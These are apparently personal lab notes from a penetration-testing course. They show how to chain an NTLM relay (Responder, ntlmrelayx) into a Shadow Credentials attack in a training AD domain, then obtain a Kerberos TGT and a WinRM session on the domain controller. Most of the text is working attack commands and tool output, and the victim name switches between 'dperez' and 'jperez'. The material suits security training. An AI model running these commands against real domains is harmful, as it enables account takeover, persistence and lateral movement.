This other attack scenario with take into consideration a chained attack that will leverage over a NTLM relay attack by gaining access to a privileged user, from here will it be chained to add Shadow Credentials to a user/computer object. 
This attack is less invasive than resetting credentials, but it persist even after a eventuall password change by the victim; giving the attacker a sort of *"persistence"*.


## Attack Scenario
As usual we start by setting up a listener on our attacking machine(**REMEMBBER:** `SMB` and `HTTP` servers are set to `Off`).
```shell-session
sudo python3 Responder.py -I ens192
```
Now the example takes into consideration that we have spoofed a NTLM connection from a privileged **user(cjaq)** over the *LDAPs* protocol.
Now we we kick a ntlmrelay from the user **CJAQ** to write some shadow-credentials over the victim user **dperez**.
```shell-session
ntlmrelayx.py -t ldap://INLANEFREIGHT\\CJAQ@172.16.117.3 --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Servers started, waiting for connections
[*] Setting up RAW Server on port 6666
[*] HTTPD(80): Client requested path: /xml;
[*] HTTPD(80): Connection from INLANEFREIGHT/CJAQ@172.16.117.60 controlled, attacking target ldap://INLANEFREIGHT\CJAQ@172.16.117.3
[*] HTTPD(80): Client requested path: /i0t823yj4q
[*] HTTPD(80): Authenticating against ldap://INLANEFREIGHT\CJAQ@172.16.117.3 as INLANEFREIGHT/CJAQ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] Searching for the target account
[*] Target user found: CN=Jeffry Perez,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 0e7ed4f1-1a8f-180b-cb7a-602f765c9cc6
[*] Updating the msDS-KeyCredentialLink attribute of jperez
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: rbnYdUv8.pfx
[*] Must be used with password: NRzoep723H6Yfc0pY91Z
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z INLANEFREIGHT.LOCAL/jperez rbnYdUv8.ccache
```
The obtained certificate from the **Shadow Credenitals attack(aka Windows Hello or Business authentication)** can be used to obtain a valid TGT for the victim *DPEREZ*.
```shell-session
python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z INLANEFREIGHT.LOCAL/jperez jperez.ccache
```
Use the obtained *ccache* to take your attacks even further into the AD environment.
```
KRB5CCNAME=jperez.ccache evil-winrm -i dc01.inlanefreight.local -r INLANEFREIGHT.LOCAL
```